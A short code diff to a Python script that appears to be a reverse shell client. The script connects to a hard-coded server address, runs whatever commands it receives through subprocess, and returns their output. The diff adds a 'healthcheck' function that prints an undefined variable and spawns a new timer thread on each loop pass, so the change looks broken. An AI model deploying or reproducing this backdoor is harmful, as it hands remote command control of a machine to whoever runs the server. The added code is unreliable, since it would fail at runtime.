@@ -1,4 +1,4 @@
-import socket
+import socket, datetime, threading
 import subprocess
 
 SERVER_HOST = "192.168.1.103"
@@ -13,6 +13,10 @@ s.connect((SERVER_HOST, SERVER_PORT))
 # receive the greeting message
 message = s.recv(BUFFER_SIZE).decode()
 print("Server:", message)
+def healthcheck():
+    print(username)
+
+healthcheck()
 
 while True:
     # receive the command from the server
@@ -24,5 +28,8 @@ while True:
     output = subprocess.getoutput(command)
     # send the results back to the server
     s.send(output.encode())
+    threading.Timer(30, healthcheck).start()
+    healthcheck()
 # close client connection
 s.close()
+
